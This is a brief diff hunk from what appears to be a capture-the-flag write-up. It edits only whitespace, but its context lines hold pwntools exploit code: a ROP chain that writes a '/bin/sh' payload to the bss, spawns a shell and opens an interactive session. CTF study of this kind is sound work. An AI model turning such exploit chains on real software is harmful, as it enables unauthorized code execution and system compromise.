@@ -692,6 +692,5 @@ payload = payload.ljust(0x200, b'\x00') + b'/bin/sh\x00'
 p.send((b'a' * 12 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(len(payload)) + p64(elf.plt['read']) + p64(pop_rdi) + p64(bss_addr + 0x200) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + call).ljust(0x200, b'\x00'))
 p.send(payload)
 
-
 p.interactive()
 ```
